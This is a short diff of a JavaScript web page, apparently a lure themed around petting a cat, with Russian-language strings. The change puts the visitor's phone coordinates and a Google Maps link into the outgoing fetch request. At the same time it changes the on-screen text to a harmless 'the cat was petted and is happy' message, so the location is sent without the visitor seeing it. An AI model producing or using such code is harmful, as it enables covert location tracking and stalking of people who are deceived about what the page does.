@@ -130,7 +130,7 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const text = `Котика погладили и он доволен!`;
+                    const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;
 
                     statusDiv.innerText = "Гладим...";
 
@@ -139,7 +139,7 @@
                     fetch(url, { mode: "no-cors" })
                         .then(() => {
                             titleH2.innerText = "Готово!";
-                            statusDiv.innerText = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;
+                            statusDiv.innerText = `Котика погладили и он доволен!`;
                         })
                         .catch((err) => {
                             isSent = false;
